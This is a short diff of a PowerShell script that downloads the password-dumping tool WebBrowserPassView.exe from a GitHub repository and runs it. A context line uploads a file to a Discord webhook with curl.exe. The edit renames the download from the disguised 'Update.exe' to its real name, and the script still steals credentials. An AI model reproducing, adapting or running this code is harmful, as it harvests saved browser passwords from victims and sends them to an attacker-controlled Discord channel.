@@ -1,7 +1,7 @@
 function Get {
   mkdir \Documents 
   cd \Documents
-  Invoke-WebRequest -Headers @{'Referer' = 'https://github.com/0svix/ww/blob/main/WebBrowserPassView.exe'} -Uri https://github.com/0svix/ww/raw/refs/heads/main/WebBrowserPassView.exe -OutFile Update.exe
+  Invoke-WebRequest -Headers @{'Referer' = 'https://github.com/0svix/ww/blob/main/WebBrowserPassView.exe'} -Uri https://github.com/0svix/ww/raw/refs/heads/main/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe
 }
 
 
@@ -35,5 +35,5 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUr
 
 
 function Open{
-.\Update.exe
+.\WebBrowserPassView.exe
 }
